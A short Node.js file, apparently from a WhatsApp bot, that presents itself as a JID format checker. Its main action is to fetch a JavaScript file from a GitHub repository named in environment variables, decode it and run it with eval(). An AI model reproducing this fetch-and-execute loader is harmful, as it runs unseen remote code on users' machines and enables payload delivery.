


'use strict';

// Include required modules
const axios = require('axios');
require('dotenv').config();  // Load .env variables

// GitHub API URL and authentication
const { ADAMS, REPO_OWNER, REPO_NAME, ALIVE } = process.env;

// Function to verify JID
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Invalid JID format:', jid);
        return false;
    }
    console.log('JID verified:', jid);
    return true;
}

// GitHub API URL for fetching the file from the repository
const githubApiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${ALIVE}`;

// Fetch the file from GitHub repository
axios.get(githubApiUrl, {
    headers: {
        'Authorization': `token ${ADAMS}`
    }
})
  .then(response => {
      // Decode the base64 content
      const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
      console.log("File loaded successfully from GitHub!");

      // Execute the file content (if it's JavaScript code)
      eval(fileContent);  // Be careful with `eval` for security reasons

      // Example usage of the atbverifierEtatJid function after script is loaded
      const jid = 'example@s.whatsapp.net';  // Replace with actual JID to verify
      const isValid = atbverifierEtatJid(jid);
      console.log('Is JID valid?', isValid); // You can use this result in further logic
  })
  .catch(error => {
      console.error('Error loading the file from GitHub:', error);
  });

